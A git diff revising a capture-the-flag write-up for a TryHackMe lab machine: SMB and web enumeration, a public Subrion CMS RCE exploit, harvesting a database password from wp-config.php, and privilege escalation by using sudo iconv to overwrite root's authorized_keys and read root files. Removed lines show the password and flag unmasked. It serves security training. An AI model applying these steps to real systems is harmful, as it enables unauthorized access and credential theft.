@@ -1,3 +1,9 @@
+Welcome to another CTF-writeup !! Tech_support:1 by vikaran. What we can learn from this machine. 
+* nmap scan , smbmap etc. (enumeration skills)
+* subrion cms 4.2.1 RCE
+* iconv sudo permission to overwritten files and look for files
+
+Let's start with enumeration. First with nmap to see what port we have in the box.
 ## Nmap scan
 ```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
@@ -43,41 +49,24 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.93 seconds
 ```
-## feroxbuster 
-```bash
-──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
-└─$ feroxbuster --collect-backups -e -u http://10.10.168.200/                             1 ⨯
+Nmap scan shows we got a webpage on port 80 and 445 smb also open. Let's see the webpage.
 
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.6.4
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://10.10.168.200/
- 🚀  Threads               │ 50
- 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
- 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.6.4
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 🏦  Collect Backups       │ true
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
- 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-```
+![](Images/web1.png)
 
-/test/ - hint
-/icon/ - 403 forbidden
-/wordpress/ -404 not found
+## Feroxbuster or Gobuster
+I ran feroxbuster(It is a new web dir search tool written with R) to see is there any directories. I found 2 useful web directories.  
 
-wpscan --url http://[ip]/wordpress/ -e u,vp,vt
+* /test/ - hint
+  ![](Images/test%20dir.png)
+* /icon/ - 403 forbidden
+* /wordpress/ -404 not found
+![](Images/wordpress.png)
 
-## smbmap 
+I try to run wpscan and found a account called **support**.
 
+## Playing with Smbmap and Smbclient
+
+Let's head over to port 445 smb. When we map the smb port we can see read only disk called **websvr**. 
 ```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
 └─$ smbmap -H 10.10.168.200
@@ -88,7 +77,8 @@ wpscan --url http://[ip]/wordpress/ -e u,vp,vt
 	websvr                                            	READ ONLY	
 	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))
 ```
-## smb client 
+Let's try to login to websvr without password.
+
 ```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
 └─$ smbclient \\\\10.10.168.200\\websvr  
@@ -103,7 +93,10 @@ smb: \> ls
 smb: \> get enter.txt
 getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 smb: \> exit
-                                                                                               
+```
+When we log into the websvr we can see one file called **enter.txt** Let's read the file maybe it could contain some password.
+
+```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
 └─$ cat enter.txt
 GOALS
@@ -119,14 +112,25 @@ Subrion creds
 Wordpress creds
 |->
 ```
-## panel website
+My guess is correct ! we found subrion creds but It encoded with magic. Let's decode this with cyberchef.
 
-cyber chef decode and login to admin (magic)
+![](Images/cyber%20chef%20magic.png)
 
-exploit
-https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE
+## Subrion Panel
 
-CVE-2018-19422-SubrionCMS-RCE
+After I read about subrion cms through github (https://github.com/intelliants/subrion) I setup a gobuster scan to scan **/subrion** directory. It found a directory called **/panel** just like our note says. Let's log with our creds.
+
+![](Images/subrion%20panel.png)
+
+This subrion CMS version also vurnerable to RSE. Before we go looking into exploit I look inside in the panel. We have a upload tab to upload our reverse shell. 
+
+![](Images/dashboard%20subrion.png)
+
+We can upload php file to get access to system. But I tried different thing instead of uploading reverse shell I tried this script to do the dirty work.
+
+Script : https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE
+
+But if you wanna upload a file and do it yourself makesure your php file should be **.phar**.
 
 ```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1/CVE-2018-19422-SubrionCMS-RCE]
@@ -147,16 +151,17 @@ CVE-2018-19422-SubrionCMS-RCE
 
 $ whoami
 www-data
-```
 
-## wp-config
-```bash
 $ ls -la /home
 total 12
 drwxr-xr-x  3 root     root     4096 May 28  2021 .
 drwxr-xr-x 23 root     root     4096 May 28  2021 ..
 drwxr-xr-x  4 scamsite scamsite 4096 May 29  2021 scamsite
+```
+We got into www-data and we got a user called scamsite. First see through wordpress. Because earlier I saw web directory called wordpress.
 
+## Looking for wp-config file
+```bash
 $ ls -la /var/www/html/wordpress/
 total 220
 drwxr-xr-x  5 www-data www-data  4096 May 29  2021 .
@@ -172,16 +177,9 @@ drwxr-xr-x  9 www-data www-data  4096 May 13  2021 wp-admin
 -rwxr-xr-x  1 www-data www-data  2992 May 29  2021 wp-config.php
 drwxr-xr-x  6 www-data www-data  4096 May 29  2021 wp-content
 -rwxr-xr-x  1 www-data www-data  3939 Jul 31  2020 wp-cron.php
-drwxr-xr-x 25 www-data www-data 12288 May 13  2021 wp-includes
--rwxr-xr-x  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
--rwxr-xr-x  1 www-data www-data  3313 Jan 11  2021 wp-load.php
--rwxr-xr-x  1 www-data www-data 44994 Apr  5  2021 wp-login.php
--rwxr-xr-x  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
--rwxr-xr-x  1 www-data www-data 21125 Feb  2  2021 wp-settings.php
--rwxr-xr-x  1 www-data www-data 31328 Jan 28  2021 wp-signup.php
--rwxr-xr-x  1 www-data www-data  4747 Oct  9  2020 wp-trackback.php
--rwxr-xr-x  1 www-data www-data  3236 Jun  9  2020 xmlrpc.php
-
+```
+We found a wp-config file. Let's see what we got here.
+```bash
 $ cat /var/www/html/wordpress/wp-config.php
 <?php
 /**
@@ -211,7 +209,7 @@ define( 'DB_NAME', 'wpdb' );
 define( 'DB_USER', 'support' );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+define( 'DB_PASSWORD', 'ImASca***********!123!' );
 
 /** MySQL hostname */
 define( 'DB_HOST', 'localhost' );
@@ -221,63 +219,9 @@ define( 'DB_CHARSET', 'utf8' );
 
 /** The Database Collate type. Don't change this if in doubt. */
 define( 'DB_COLLATE', '' );
-
-/**#@+
- * Authentication Unique Keys and Salts.
- *
- * Change these to different unique phrases!
- * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
- * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define( 'AUTH_KEY',         'put your unique phrase here' );
-define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
-define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
-define( 'NONCE_KEY',        'put your unique phrase here' );
-define( 'AUTH_SALT',        'put your unique phrase here' );
-define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
-define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
-define( 'NONCE_SALT',       'put your unique phrase here' );
-
-/**#@-*/
-
-/**
- * WordPress Database Table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix = 'wp_';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- *
- * For information on other constants that can be used for debugging,
- * visit the documentation.
- *
- * @link https://wordpress.org/support/article/debugging-in-wordpress/
- */
-define( 'WP_DEBUG', false );
-
-/* That's all, stop editing! Happy publishing. */
-
-/** Absolute path to the WordPress directory. */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/wordpress/' );
-}
-
-define('WP_HOME', '/wordpress/index.php');
-define('WP_SITEURL', '/wordpress/');
-
-/** Sets up WordPress vars and included files. */
-require_once ABSPATH . 'wp-settings.php';
-
 ``` 
+We got a password let's try to log into **scamsite** user.
+
 ## ssh session to scamsite user
 
 ```bash
@@ -303,8 +247,11 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
 Last login: Fri May 28 23:30:20 2021
 scamsite@TechSupport:~$ 
 ```
+We get into our user account. Let's see what we got on this.
 
-## sudo priv
+## sudo privileges
+Before ran emumerting scripts like linpeas. Let's see about sudo privileges given into the user.
+
 ```bash
 scamsite@TechSupport:~$ sudo -l
 Matching Defaults entries for scamsite on TechSupport:
@@ -314,18 +261,23 @@ Matching Defaults entries for scamsite on TechSupport:
 User scamsite may run the following commands on TechSupport:
     (ALL) NOPASSWD: /usr/bin/iconv
 ```
-## gtfo bins
+I search about this on gtfobins(https://gtfobins.github.io/gtfobins/iconv/).
 
-ssh-keygen
+![](Images/gtfo.png)
 
+I think we got two methods to get a root flag.
+
+## Method 1 - Login into root account
+We can overwritten or put a new ssh key to the system. First we need to genarate a ssh key on our machine by typing **ssh-keygen** command and do the following commands. 
+```bash
 LFILE=/root/.ssh/authorized_keys
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
-" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
-
+echo "your id_rsa.pub" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
+```
+Then we can log into the root account by using our private key.
 ```bash
 ┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
-└─$ ssh root@10.10.252.87 -i defalt 
+└─$ ssh root@10.10.252.87 -i id_rsa 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -341,15 +293,16 @@ Last login: Sun Nov 21 11:17:57 2021
 root@TechSupport:~# ls
 root.txt
 root@TechSupport:~# cat root.txt
-851b8233a8c09400ec30651bd1529bf1ed02790b  -
+851b8233a8c09400ec30651bd152**********  -
 root@TechSupport:~# 
 ```
 
+## Method 2
+
+We don't need to login to see root flag by using this command.
+
 ```bash
-scamsite@TechSupport:~$ LFILE=/root/.ssh/authorized_keys
-scamsite@TechSupport:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
-> " | sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
-iconv: cannot open input file `/root/.ssh/authorized_keys': No such file or directory
-scamsite@TechSupport:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
-" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
+sudo -u root iconv  -f 8859_1 -t 8859_1 "/root/root.txt"
 ```
+
+Thx for reading !! Have a nice day
